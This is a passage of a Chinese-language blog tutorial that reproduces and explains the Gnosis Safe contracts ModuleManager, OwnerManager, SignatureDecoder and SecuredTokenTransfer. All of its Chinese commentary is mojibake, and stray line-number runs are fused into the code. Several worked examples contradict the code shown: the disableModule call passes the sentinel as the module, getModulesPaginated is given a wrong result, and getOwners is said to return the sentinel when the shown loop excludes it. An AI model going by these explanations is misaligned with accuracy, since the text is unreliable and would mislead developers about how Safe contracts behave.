address(0), &quot;GS102&quot;); // è¡¨ç¤º module å·²ç»è¢«æ·»åŠ è¿‡äº†ï¼Œä¸æ˜¯ address(0)äº† modules[module] = modules[SENTINEL_MODULES]; // é‡ç½® SENTINEL_MODULES çš„æ˜ å°„ modules[SENTINEL_MODULES] = module; emit EnabledModule(module); &#125; /// @dev Allows to remove a module from the whitelist. /// This can only be done via a Safe transaction. /// @notice Disables the module `module` for the Safe. /// @param prevModule Module that pointed to the module to be removed in the linked list /// @param module Module to be removed. function disableModule(address prevModule, address module) public authorized &#123; // Validate module address and check that it corresponds to module index. require(module != address(0) &amp;&amp; module != SENTINEL_MODULES, &quot;GS101&quot;); // éªŒè¯ prevModule æ˜¯ä¸æ˜¯ moduleçš„å‰ä¸€ä¸ªæ¨¡å— require(modules[prevModule] == module, &quot;GS103&quot;); // å°† moduleç°åœ¨çš„èº«ä»½è½¬äº¤åˆ° preModuleä¸Š modules[prevModule] = modules[module]; // ç§»é™¤ module çš„èº«ä»½ modules[module] = address(0); emit DisabledModule(module); &#125; /// @dev Allows a Module to execute a Safe transaction without any further confirmations. // å…è®¸æ¨¡å—æ‰§è¡Œå®‰å…¨äº‹åŠ¡ï¼Œæ— éœ€ä»»ä½•è¿›ä¸€æ­¥ç¡®è®¤ /// @param to Destination address of module transaction. /// @param value Ether value of module transaction. /// @param data Data payload of module transaction. /// @param operation Operation type of module transaction. /** è°ƒç”¨ Executoråˆçº¦ä¸­çš„ executeå‡½æ•°ï¼Œè°ƒç”¨ to ä¸­çš„ä¸€äº›æ“ä½œ */ function execTransactionFromModule( address to, uint256 value, bytes memory data, Enum.Operation operation ) public virtual returns (bool success) &#123; // Only whitelisted modules are allowed. // åªæœ‰è¢«æ·»åŠ åˆ°ç™½åå•æ‰å¯ä»¥è¢«æ‰§è¡Œ require(msg.sender != SENTINEL_MODULES &amp;&amp; modules[msg.sender] != address(0), &quot;GS104&quot;); // Execute transaction without further confirmations. success = execute(to, value, data, operation, gasleft()); if (success) emit ExecutionFromModuleSuccess(msg.sender); else emit ExecutionFromModuleFailure(msg.sender); &#125; /// @dev Allows a Module to execute a Safe transaction without any further confirmations and return data /// @param to Destination address of module transaction. /// @param value Ether value of module transaction. /// @param data Data payload of module transaction. /// @param operation Operation type of module transaction. /** å’Œ execTransactionFromModule å·®ä¸å¤šåªæ˜¯å¤šäº†ä¸ªè¿”å›å€¼returnData */ function execTransactionFromModuleReturnData( address to, uint256 value, bytes memory data, Enum.Operation operation ) public returns (bool success, bytes memory returnData) &#123; success = execTransactionFromModule(to, value, data, operation); // solhint-disable-next-line no-inline-assembly // å¦‚ä¸‹æ“ä½œæ˜¯ä¸ºäº†å¾—åˆ° returnDate assembly &#123; // Load free memory location let ptr := mload(0x40) // We allocate memory for the return data by setting the free memory location to // current free memory location + data size + 32 bytes for data size value mstore(0x40, add(ptr, add(returndatasize(), 0x20))) // Store the size mstore(ptr, returndatasize()) // Store the data returndatacopy(add(ptr, 0x20), 0, returndatasize()) // Point the return data to the correct memory location returnData := ptr &#125; &#125; /// @dev Returns if an module is enabled /// @return True if the module is enabled /** åˆ¤æ–­ è¯¥module æ˜¯å¦è¢«æ·»åŠ åˆ°ç™½åå•ä¹‹ä¸­ */ function isModuleEnabled(address module) public view returns (bool) &#123; return SENTINEL_MODULES != module &amp;&amp; modules[module] != address(0); &#125; /// @dev Returns array of modules. /// @param start Start of the page. /// @param pageSize Maximum number of modules that should be returned. /// @return array Array of modules. /// @return next Start of the next page. /** å¾—åˆ°ä¸€ä¸ªæ¨¡å—çš„æ˜ å°„é“¾ */ function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next) &#123; // Init array with max page size array = new address[](pageSize); // Populate return array uint256 moduleCount = 0; address currentModule = modules[start]; while (currentModule != address(0x0) &amp;&amp; currentModule != SENTINEL_MODULES &amp;&amp; moduleCount &lt; pageSize) &#123; array[moduleCount] = currentModule; currentModule = modules[currentModule]; moduleCount++; &#125; next = currentModule; // Set correct size of returned array // solhint-disable-next-line no-inline-assembly assembly &#123; mstore(array, moduleCount) &#125; &#125;&#125; è§£è¯» enableModuleå‡½æ•°ï¼š å°†ä¸€ä¸ªæ¨¡å—åŠ å…¥ç™½åå•ï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„é€»è¾‘å¯ä»¥å‘ç°ï¼Œå®ƒå°†åŸå“¨å…µæ¨¡å—ï¼ˆSENTINEL_MODULESï¼‰ å¯¹åº”çš„åœ°å€èµ‹å€¼ç»™æœ€æ–°çš„æ¨¡å—ï¼Œç„¶åå°†å“¨å…µæ¨¡å—çš„å€¼è®¾ç½®ä¸ºæœ€æ–°æ·»åŠ çš„æ¨¡å—ã€‚ å®é™…è°ƒç”¨æ­¤å‡½æ•°ï¼Œè¯´æ˜å…¶ç”¨æ³•ï¼š 12345678910/** ä¼ªä»£ç ï¼Œ è°ƒç”¨ enableMoudule å‡½æ•°*/enableModule(0x3);enableModule(0x4);enableModule(0x5);/** æˆ‘ä»¬å¾—åˆ°çš„ç»“æœ */modules[0x3] = 0x1;modules[0x4] = 0x3;modules[0x5] = 0x4;modules[0x1] = 0x5; ä»¥ä¸Šå°±æ˜¯è¿ç»­è°ƒç”¨ è¯¥å‡½æ•°çš„èµ‹å€¼è¿‡ç¨‹åŠç»“æœã€‚ è§£è¯» disableModule å‡½æ•°ï¼š å®é™…è°ƒç”¨å‡½æ•°å®è·µ 1234567891011121314/** å‡½æ•°è°ƒç”¨,å‡è®¾æ‰§è¡Œå¦‚ä¸‹ä¸¤æ¡æ‰§è¡Œ */disableModule(0x3,0x1);disableModule(0x4,0x3);// ç¬¬ä¸€æ¡modules[0x3] = modules[0x1] = 0x5, modules[0x1] = 0x0// å‰©ä¸‹çš„æ¨¡å—é“¾modules[0x3] = 0x5;modules[0x4] = 0x3;modules[0x5] = 0x4;// ç¬¬äºŒæ¡modules[0x4] = modules[0x3] = 0x5, modules[0x3] = 0x0// å‰©ä¸‹çš„æ¨¡å—é“¾modules[0x4] = 0x5;modules[0x5] = 0x4; ä»¥ä¸Šå°±æ˜¯è¿ç»­è°ƒç”¨ è¯¥å‡½æ•°çš„èµ‹å€¼è¿‡ç¨‹åŠç»“æœã€‚ æ³¨ï¼šä»¥ä¸Šä¸¤ä¸ªå‡½æ•°çš„éƒ½æœ‰authorizedä¿®é¥°ç¬¦ä¿®é¥°ï¼Œé™åˆ¶äº†å‡½æ•°è°ƒç”¨è€…çš„èº«ä»½ã€‚ è§£è¯» execTransactionFromModule å‡½æ•°ï¼š è¯¥å‡½æ•°å®é™…ä¸Šå°±æ˜¯åœ¨è°ƒç”¨ Executoråˆçº¦ä¸­çš„ executeå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°çš„è°ƒç”¨è€…éœ€è¦è¢«æ·»åŠ åˆ°ç™½åå•ä¸­ã€‚ è§£è¯» execTransactionFromModuleReturnDataå‡½æ•°ï¼š åŒä¸Šä¸€ä¸ªå‡½æ•°å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªè¿”å›å€¼ returnDataï¼Œç»†çœ‹å…¶ä¸­çš„è·å–è¿”å›å€¼çš„å†…è”æ±‡ç¼–éƒ¨åˆ†ã€‚ 12345678910111213assembly &#123; // Load free memory location let ptr := mload(0x40) // We allocate memory for the return data by setting the free memory location to // current free memory location + data size + 32 bytes for data size value mstore(0x40, add(ptr, add(returndatasize(), 0x20))) // Store the size mstore(ptr, returndatasize()) // Store the data returndatacopy(add(ptr, 0x20), 0, returndatasize()) // Point the return data to the correct memory location returnData := ptr &#125; å¾—åˆ°è‡ªç”±å†…å­˜æŒ‡é’ˆåœ°å€ï¼ˆå­˜åœ¨0x40)ã€‚ å°†è‡ªç”±å†…å­˜æŒ‡é’ˆåœ°å€é‡æ–°è®¾å®šåœ¨å½“å‰åœ°å€ + æ•°æ®å¤§å° + é•¿åº¦å‰ç¼€ çš„åœ°å€ï¼Œå¤šå‡ºæ¥çš„ç©ºé—´ï¼ˆé•¿åº¦å‰ç¼€ + æ•°æ®å¤§å° ï¼‰ä¸ºæ˜¯äº†æ„é€  è¿”å›å€¼returnDataã€‚ å†™å…¥é•¿åº¦å‰ç¼€ï¼Œä»æ—§è‡ªç”±å†…å­˜æŒ‡é’ˆåœ°å€å¼€å§‹å†™å…¥ä¸€ä¸ªword(32å­—èŠ‚ï¼‰ï¼Œå€¼ä¸ºè¿”å›çš„æ•°æ®å¤§å°ã€‚è¿™é‡Œçš„è¿”å›æ•°æ®å“ªæ¥çš„å‘¢ï¼Ÿå› ä¸ºæœ¬å‡½æ•°è°ƒç”¨äº†execTransactionFromModuleå‡½æ•°ï¼Œè™½ç„¶execTransactionFromModuleå‡½æ•°æ˜¯ä¸ªpublicå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå´åªæ˜¯å†…éƒ¨è·³è½¬ï¼Œå¹¶æ²¡æœ‰æ¶‰åŠåˆ°æ¶ˆæ¯è°ƒç”¨ï¼Œå› æ­¤ä½ å¯ä»¥è®¤ä¸ºæ˜¯execTransactionFromModuleçš„ä»£ç ç›´æ¥å¤åˆ¶äº†è¿‡æ¥ã€‚è€ŒexecTransactionFromModuleåˆè°ƒç”¨äº†executeï¼Œè¿™åŒæ ·æ˜¯ä¸€ä¸ªå†…éƒ¨è°ƒç”¨ï¼Œå› æ­¤è¿”å›å€¼æ¥æºäºexecuteçš„æ‰§è¡Œç»“æœã€‚ æ³¨æ„ï¼Œè¿™é‡Œåªæœ‰æ¶ˆæ¯è°ƒç”¨ï¼ˆåˆçº¦ä¹‹é—´æˆ–è€…EOAä¸åˆçº¦ä¹‹é—´ï¼‰æ‰ä¼šæœ‰returndataï¼Œå®ƒå¹¶ä¸æ˜¯æ™®é€šå‡½æ•°ä¹‹é—´ç›¸äº’è°ƒç”¨çš„è¿”å›å€¼ï¼ˆå‡½æ•°è¿”å›å€¼æ˜¯Solidityè¯­è¨€ï¼‰ã€‚ å°†returndataçš„å†…å®¹å¤åˆ¶åˆ°å†…å­˜ä¸­ï¼Œreturndatacopyæ“ä½œç æˆ‘ä»¬å·²ç»å¤šæ¬¡è§åˆ°ï¼Œä¸ºä»€ä¹ˆä»add(ptr, 0x20)å¼€å§‹å‘¢ï¼Œå› ä¸ºptrå¼€å§‹çš„32å­—èŠ‚æˆ‘ä»¬åœ¨ä¸Šä¸€æ­¥å­˜å…¥äº†é•¿åº¦å‰ç¼€ã€‚ æœ€åè®¾å®šè¿”å›Solidityè¿”å›æ•°æ®returnDataçš„å†…å­˜åœ°å€ï¼Œä»prtå¼€å§‹åˆ†åˆ«ä¸ºå®ƒçš„é•¿åº¦å‰ç¼€å’Œå®é™…æ•°æ®ã€‚ è§£è¯» getModulesPaginated å‡½æ•°ï¼š åˆ†é¡µè·å–ç™½åå•æ¨¡å—ï¼Œè¿”å›ä¸€ä¸ªç™½åå•æ•°ç»„ã€‚è¿™é‡Œä¸ºä»€ä¹ˆè¦é‡‡ç”¨åˆ†é¡µå‘¢ï¼Ÿå› ä¸ºç†è®ºä¸Šï¼Œå¯ä»¥æ³¨å†Œä¸ªæ— æ•°æ¨¡å—ï¼Œå› æ­¤è¿”å›çš„æ•°æ®å¯ä»¥æ— é™å¤§ã€‚ç„¶è€Œå´æ˜¯æœ‰gasLimitçš„ï¼Œæ‰€ä»¥æ•°ç»„è¿‡å¤§ä¼šå¯¼è‡´è°ƒç”¨å¤±è´¥ï¼Œå› æ­¤é‡‡ç”¨äº†åˆ†é¡µæ¨¡å¼ï¼Œå¯ä»¥è°ƒæ•´è¿”å›çš„æ•°ç»„å¤§å°å’Œèµ·å§‹ä½ç½®ã€‚ è¿™é‡Œviewç±»å‹çš„å‡½æ•°åŒæ ·ä¹Ÿä¼šå—åˆ°gasé™åˆ¶ï¼ŒåŒæ ·ä¹Ÿä¼šgasè¶…é™ã€‚ æœ¬å‡½æ•°çš„é€»è¾‘ä½¿ç”¨äº†ä¸€ä¸ªwhileä»åå‘å‰å¾ªç¯æ¨¡å—é“¾ï¼Œå–å‡ºåˆ†é¡µå¤§å°çš„æ¨¡å—ã€‚å¦‚æœä¸è¶³ï¼ˆæ²¡æœ‰æ³¨å†Œæˆ–è€…ä¸ºå“¨å…µæ¨¡å—ï¼‰ï¼Œåˆ™ç«‹åˆ»ç»ˆæ­¢ã€‚ ä¸€ä¸ªæ¯”è¾ƒå®ç”¨çš„æŠ€å·§æ˜¯æœ€åçš„å†…åµŒæ±‡ç¼–ï¼Œç”¨æ¥æ”¹å˜è¿”å›æ•°ç»„çš„å¤§å°ã€‚ 123assembly &#123; mstore(array, moduleCount) &#125; æˆ‘ä»¬çŸ¥é“ï¼Œæ•°ç»„åœ¨æ±‡ç¼–ä¸­çš„å†…å­˜layoutä¹Ÿæ˜¯å€¼ä¸ºå†…å­˜åœ°å€ï¼Œå¼€å§‹32å­—èŠ‚å­˜çš„æ˜¯æ•°ç»„é•¿åº¦ï¼Œåé¢å†æ¥æ•°æ®å†…å®¹ã€‚ ç”±äºæˆ‘ä»¬åˆ†é¡µè·å–çš„æ•°ç»„å¯èƒ½æœªå¡«å……æ»¡ï¼Œæ¯”å¦‚å–10ä¸ªï¼Œæˆ‘ä»¬åªæœ‰4ä¸ªã€‚å› æ­¤åé¢6ä¸ªå…ƒç´ ä¸ºç©ºçš„ã€‚æ­¤æ—¶æˆ‘ä»¬è¿”å›ç©ºå…ƒç´ çš„è¯ä¼šæµªè´¹ç©ºé—´ã€‚å› æ­¤ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹è¿”å›çš„æ•°æ®å¤§å°ä¸º4ï¼Œè¿™é‡Œå°±ç¤ºä¾‹äº†ä¸€ç§ç›´æ¥ä¿®æ”¹æ–¹æ³•ã€‚ ç›´æ¥å°†æ•°ç»„åœ°å€å¼€å§‹çš„32å­—èŠ‚ï¼ˆå­˜å‚¨æ•°ç»„å¤§å°ï¼‰èµ‹å€¼ä¸ºå®é™…æ•°ç»„å¤§å°ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå®ç”¨çš„æŠ€å·§ï¼Œæˆ‘ä»¬å¹³å¸¸åœ¨é‡åˆ°æ•°ç»„ä¸èƒ½å¡«å……æ»¡æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤æŠ€å·§ã€‚ ä¿®æ”¹å¤§å°åæœ¬æ¥è¿”å›10ä¸ªå…ƒç´ çš„æ•°ç»„å˜æˆäº†è¿”å›4ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œè€Œæœ‰æ•ˆå†…å®¹æ˜¯ç›¸åŒçš„ 1234567891011// å‡å¦‚æˆ‘ä»¬çš„æ¨¡å—é“¾å¦‚ä¸‹modules[0x3] = 0x1;modules[0x4] = 0x3;modules[0x5] = 0x4;modules[0x1] = 0x5;// è°ƒç”¨æ­¤å‡½æ•°getModulesPaginated(0x4,3)// è¿”å›çš„arrayç»“æœarray = [0x3,0x1,0x5] 4. OwnerManager.solæœ‰æ•°æ®ç»“æ„çš„åº•å­å°±æ›´å¥½äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/SelfAuthorized.sol&quot;;/// @title OwnerManager - Manages a set of owners and a threshold to perform actions./// @author Stefan George - &lt;stefan@gnosis.pm&gt;/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract OwnerManager is SelfAuthorized &#123; event AddedOwner(address owner); event RemovedOwner(address owner); event ChangedThreshold(uint256 threshold); address internal constant SENTINEL_OWNERS = address(0x1); // å­˜å‚¨æŸåœ°å€çš„ownerçš„æ˜ å°„ mapping(address =&gt; address) internal owners; uint256 internal ownerCount; // owneræ•°é‡ uint256 internal threshold; // é—¨æ§› /// @dev Setup function sets initial storage of contract. /// @param _owners List of Safe owners. /// @param _threshold Number of required confirmations for a Safe transaction. function setupOwners(address[] memory _owners, uint256 _threshold) internal &#123; // Threshold can only be 0 at initialization. // Check ensures that setup function can only be called once. // ç¡®ä¿æ­¤å‡½æ•°åªèƒ½è¢«æ‰§è¡Œä¸€æ¬¡ require(threshold == 0, &quot;GS200&quot;); // Validate that threshold is smaller than number of added owners. require(_threshold &lt;= _owners.length, &quot;GS201&quot;); // There has to be at least one Safe owner. require(_threshold &gt;= 1, &quot;GS202&quot;); // Initializing Safe owners. address currentOwner = SENTINEL_OWNERS; /** å½¢æˆäº†ä¸€ä¸ªç¯çŠ¶é“¾ï¼Œ SENTINEL_OWNERS -&gt; ... -&gt; SENTINEL_OWNERS */ for (uint256 i = 0; i &lt; _owners.length; i++) &#123; // Owner address cannot be null. address owner = _owners[i]; require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this) &amp;&amp; currentOwner != owner, &quot;GS203&quot;); // No duplicate owners allowed. require(owners[owner] == address(0), &quot;GS204&quot;); // é™åˆ¶äº†ä¸€ä¸ªåœ°å€åªèƒ½è¢«æ·»åŠ ä¸€æ¬¡ owners[currentOwner] = owner; currentOwner = owner; &#125; // æ­¤æ—¶éå†åˆ°äº†æœ€åä¸€ä¸ªç´¢å¼•ï¼Œå°† owners[last]æŒ‡å‘SENTINEL_OWNERS owners[currentOwner] = SENTINEL_OWNERS; ownerCount = _owners.length; threshold = _threshold; &#125; /// @dev Allows to add a new owner to the Safe and update the threshold at the same time. /// This can only be done via a Safe transaction. /// @notice Adds the owner `owner` to the Safe and updates the threshold to `_threshold`. /// @param owner New owner address. /// @param _threshold New threshold. /** å’Œæ•°æ®ç»“æ„ä¸­å•å‘å¾ªç¯é“¾è¡¨çš„æ·»åŠ æ–¹å¼å·®ä¸å¤š */ function addOwnerWithThreshold(address owner, uint256 _threshold) public authorized &#123; // Owner address cannot be null, the sentinel or the Safe itself. require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this), &quot;GS203&quot;); // No duplicate owners allowed. require(owners[owner] == address(0), &quot;GS204&quot;); owners[owner] = owners[SENTINEL_OWNERS]; owners[SENTINEL_OWNERS] = owner; ownerCount++; emit AddedOwner(owner); // Change threshold if threshold was changed. if (threshold != _threshold) changeThreshold(_threshold); &#125; /// @dev Allows to remove an owner from the Safe and update the threshold at the same time. /// This can only be done via a Safe transaction. /// @notice Removes the owner `owner` from the Safe and updates the threshold to `_threshold`. /// @param prevOwner Owner that pointed to the owner to be removed in the linked list /// @param owner Owner address to be removed. /// @param _threshold New threshold. /** æ•°æ®ç»“æ„å•å‘å¾ªç¯é“¾è¡¨ */ function removeOwner( address prevOwner, address owner, uint256 _threshold ) public authorized &#123; // Only allow to remove an owner, if threshold can still be reached. require(ownerCount - 1 &gt;= _threshold, &quot;GS201&quot;); // Validate owner address and check that it corresponds to owner index. require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS, &quot;GS203&quot;); require(owners[prevOwner] == owner, &quot;GS205&quot;); owners[prevOwner] = owners[owner]; // pre æŒ‡å‘ owner.next owners[owner] = address(0); // ç§»é™¤æŒ‡é’ˆ ownerCount--; emit RemovedOwner(owner); // Change threshold if threshold was changed. if (threshold != _threshold) changeThreshold(_threshold); &#125; /// @dev Allows to swap/replace an owner from the Safe with another address. /// This can only be done via a Safe transaction. /// @notice Replaces the owner `oldOwner` in the Safe with `newOwner`. /// @param prevOwner Owner that pointed to the owner to be replaced in the linked list /// @param oldOwner Owner address to be replaced. /// @param newOwner New owner address. function swapOwner( address prevOwner, address oldOwner, address newOwner ) public authorized &#123; // Owner address cannot be null, the sentinel or the Safe itself. require(newOwner != address(0) &amp;&amp; newOwner != SENTINEL_OWNERS &amp;&amp; newOwner != address(this), &quot;GS203&quot;); // No duplicate owners allowed. require(owners[newOwner] == address(0), &quot;GS204&quot;); // Validate oldOwner address and check that it corresponds to owner index. require(oldOwner != address(0) &amp;&amp; oldOwner != SENTINEL_OWNERS, &quot;GS203&quot;); require(owners[prevOwner] == oldOwner, &quot;GS205&quot;); owners[newOwner] = owners[oldOwner]; owners[prevOwner] = newOwner; owners[oldOwner] = address(0); emit RemovedOwner(oldOwner); emit AddedOwner(newOwner); &#125; /// @dev Allows to update the number of required confirmations by Safe owners. /// This can only be done via a Safe transaction. /// @notice Changes the threshold of the Safe to `_threshold`. /// @param _threshold New threshold. function changeThreshold(uint256 _threshold) public authorized &#123; // Validate that threshold is smaller than number of owners. require(_threshold &lt;= ownerCount, &quot;GS201&quot;); // There has to be at least one Safe owner. require(_threshold &gt;= 1, &quot;GS202&quot;); threshold = _threshold; emit ChangedThreshold(threshold); &#125; function getThreshold() public view returns (uint256) &#123; return threshold; &#125; function isOwner(address owner) public view returns (bool) &#123; return owner != SENTINEL_OWNERS &amp;&amp; owners[owner] != address(0); &#125; /// @dev Returns array of owners. /// @return Array of Safe owners. function getOwners() public view returns (address[] memory) &#123; address[] memory array = new address[](ownerCount); // populate return array uint256 index = 0; address currentOwner = owners[SENTINEL_OWNERS]; while (currentOwner != SENTINEL_OWNERS) &#123; array[index] = currentOwner; currentOwner = owners[currentOwner]; index++; &#125; return array; &#125;&#125; **è§£è¯»setupOwners**ï¼š æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œå‡å®šåˆå§‹owneråˆ—è¡¨ä¸º[0x2,0x3,0x4]ï¼Œåˆå§‹é—¨æ§›ä¸º3ç­¾2ï¼Œé‚£ä¹ˆä¸¤ä¸ªå‚æ•°åˆ†åˆ«ä¸º[0x2,0x3,0x4]ä¸2ã€‚ æ‰§è¡ŒsetupOwnersåçš„ç»“æœåº”è¯¥ä¸º: 123456owners[0x1]=0x2owners[0x2]=0x3owners[0x3]=0x4owners[0x4]=0x1ownerCount = 3threshold = 2 å¯ä»¥çœ‹åˆ°ä»–ä»¬å½¢æˆäº†ä¸€ä¸ªé—­ç¯åœ°å€é“¾ã€‚ æ³¨æ„Forå¾ªç¯ä¸­æœ‰requireæ¥éªŒè¯åœ°å€ä¸èƒ½è¢«æ·»åŠ 2æ¬¡ï¼Œä¹Ÿä¸èƒ½æ·»åŠ é›¶åœ°å€å’Œå“¨å…µåœ°å€ï¼ˆæ·»åŠ å“¨å…µåœ°å€ä¼šä½¿å“¨å…µä½œç”¨å¤±æ•ˆï¼‰ã€‚ æœ€åè®°å½•äº†å½“å‰ownersçš„æ•°é‡ï¼Œå› ä¸ºownersæ˜¯ä¸ªmappingï¼Œå¦‚æœæƒ³å¾—åˆ°å®ƒçš„è®°å½•æ•°é‡å¿…é¡»ä½¿ç”¨ä¸€ä¸ªæ–°çš„çŠ¶æ€å˜é‡æ¥è®°å½•ã€‚ **è§£è¯»addOwnerWithThreshold**ï¼š è¿™é‡Œçš„æ·»åŠ æ–¹å¼æ˜¯ï¼šå•ä¸ªæ·»åŠ ï¼Œå“¨å…µæŒ‡å‘æ–°ownerï¼Œæ–°owneræŒ‡å‘ owners[SENTINEL_OWNERS]ï¼Œå¦‚æœå­¦è¿‡æ•°æ®ç»“æ„çš„è¯ï¼Œå¾ˆå®¹æ˜“ç†è§£ã€‚ æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œåœ¨ä¸Šä¸ªå‡½æ•°çš„åŸºç¡€ä¸Šï¼Œè°ƒç”¨ä¸¤æ¬¡è¯¥å‡½æ•°ï¼Œå‚æ•°åˆ†åˆ«æ˜¯ï¼š0x5 å’Œ 0x6 123456789// å¦‚ä¸‹æ˜¯è¿è¡Œç»“æœowners[0x1]=0x6owners[0x2]=0x3owners[0x3]=0x4owners[0x4]=0x1owners[0x5]=0x2owners[0x6]=0x5ownerCount = 5threshold = 2 è¿™é‡Œæœ‰5ä¸ªowneråœ°å€ï¼Œå› ä¸ºå“¨å…µåœ°å€0x1ä¸ç®—ã€‚å®ƒä»¬å’Œå“¨å…µåœ°å€å½¢æˆäº†ä¸€ä¸ªé—­ç¯ã€‚SENTINEL_OWNERSå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå·¥å…·äººï¼Œç”¨æ¥å½¢æˆé—­ç¯çš„ä»‹è´¨ï¼Œæ–¹ä¾¿ä»£ç çš„å®ç°ã€‚ **è§£è¯»removeOwner **ï¼š ç±»ä¼¼æ•°æ®ç»“æ„å•å‘å¾ªç¯é“¾è¡¨çš„åˆ é™¤èŠ‚ç‚¹æ“ä½œã€‚ æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œremove 0x03 0x04 3 ã€‚å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š 1234567owners[0x1]=0x6owners[0x2]=0x3owners[0x3]=0x1owners[0x5]=0x2owners[0x6]=0x5ownerCount = 4threshold = 3 è¿™é‡Œownerå°‘äº†ä¸€ä¸ª0x4ï¼Œæ‰€ä»¥åªæœ‰4ä¸ªäº†ï¼Œå®ƒä»¬ä»ç„¶å’Œå“¨å…µåœ°å€å½¢æˆäº†ä¸€ä¸ªé—­ç¯ã€‚ **è§£è¯»swapOwner**ï¼š ç±»ä¼¼æ•°æ®ç»“æ„ä¸­å•å‘å¾ªç¯é“¾è¡¨çš„æ›¿æ¢æ“ä½œã€‚ è¦æ±‚æ˜¯newOwnerä¸èƒ½ä¸ºaddress(0)ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚ **è§£è¯»getOwners**ï¼š ä»¥æ•°ç»„å½¢å¼è¿”å›æ•´ä¸ª ownersæ˜ å°„é“¾ï¼Œå…¶ä¸­ä¹ŸåŒ…å«äº†å“¨å…µ SENTINEL_OWNERSã€‚ 5. SignatureDecoder.solè¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªè§£æç­¾åçš„å‡½æ•°ï¼Œåä¸ºsignatureSplitï¼Œå°†ç­¾åè§£ç ä¸º r, s, vã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡r, s, våŠä»¥å¤ªåŠç­¾åæ¶ˆæ¯æ¥æ±‚å¾—å…¬é’¥ã€‚ 12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SignatureDecoder - Decodes signatures that a encoded as bytes/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SignatureDecoder &#123; /// @dev divides bytes signature into `uint8 v, bytes32 r, bytes32 s`. /// @notice Make sure to peform a bounds check for @param pos, to avoid out of bounds access on @param signatures /// @param pos which signature to read. A prior bounds check of this parameter should be performed, to avoid out of bounds access /// @param signatures concatenated rsv signatures function signatureSplit(bytes memory signatures, uint256 pos) internal pure returns ( uint8 v, bytes32 r, bytes32 s ) &#123; // The signature format is a compact form of: // &#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125; // Compact means, uint8 is not padded to 32 bytes. // solhint-disable-next-line no-inline-assembly assembly &#123; let signaturePos := mul(0x41, pos) r := mload(add(signatures, add(signaturePos, 0x20))) s := mload(add(signatures, add(signaturePos, 0x40))) // Here we are loading the last 32 bytes, including 31 bytes // of &#x27;s&#x27;. There is no &#x27;mload8&#x27; to do this. // // &#x27;byte&#x27; is not working due to the Solidity parser, so lets // use the second best option, &#x27;and&#x27; v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff) &#125; &#125;&#125; ç›¸å…³çŸ¥è¯†ï¼š é“¾æ¥ 6. SecuredTokenTransfer.solè¯¥åˆçº¦æä¾›äº†äº†ä¸€ä¸ªè½¬è´¦çš„æ–¹æ³•ï¼Œæœ¬è´¨æ˜¯è°ƒç”¨ (&quot;transfer(address,uint256)&quot;)å‡½æ•°ï¼Œè¿™é‡Œé‡‡ç”¨äº†å†…è”æ±‡ç¼–çš„æ–¹æ³•ï¼ˆå…¶ç›®çš„æ˜¯ä¸ºäº†èƒ½å¤Ÿå¾—åˆ°è¿”å›å€¼ï¼‰ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸ç†Ÿæ‚‰çš„å¯ä»¥å»çœ‹çœ‹ å®˜æ–¹æ–‡æ¡£ ã€‚ 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SecuredTokenTransfer - Secure token transfer/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SecuredTokenTransfer &#123; /// @dev Transfers a token and returns if it was a success /// @param token Token that should be transferred /// @param receiver Receiver to whom the token should be transferred /// @param amount The amount of tokens that should be transferred function transferToken( address token, address receiver, uint256 amount ) internal returns (bool transferred) &#123; // 0xa9059cbb - keccack(&quot;transfer(address,uint256)&quot;) bytes memory data = abi.encodeWithSelector(0xa9059cbb, receiver, amount); // solhint-disable-next-line no-inline-assembly assembly &#123; // We write the return value to scratch space. // See https://docs.soliditylang.org/en/v0.7.6/internals/layout_in_memory.html#layout-in-memory let success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20) switch returndatasize() case 0 &#123; transferred := success &#125; case 0x20 &#123; transferred := iszero(or(iszero(success), iszero(mload(0)))) &#125; default &#123; transferred := 0 &#125; &#125; &#125;&#125; 7. ISignatureValidator.solè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡å‡½æ•°ï¼Œå®ç°è€…å¿…é¡»è¦å®ç°å…¶ isValidSignatureæ–¹æ³•ï¼Œä¸”å½“æˆåŠŸè°ƒç”¨ isValidSignatureæ­¤å‡½æ•°æ—¶ï¼Œå¿…é¡»è¦è¿”å›ä¸€ä¸ª bytes4 